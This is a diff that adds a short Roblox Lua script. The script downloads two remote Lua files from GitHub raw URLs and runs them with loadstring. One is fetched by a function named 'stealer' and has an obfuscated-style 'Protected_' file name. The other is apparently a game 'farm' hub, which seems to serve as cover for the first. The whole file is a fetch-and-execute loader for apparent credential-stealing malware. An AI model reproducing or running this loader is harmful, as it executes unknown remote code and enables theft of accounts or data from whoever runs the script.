@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kross6x/oaksad/refs/heads/main/Protected_6032436171772480.lua"))()
+end
+local function farm()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
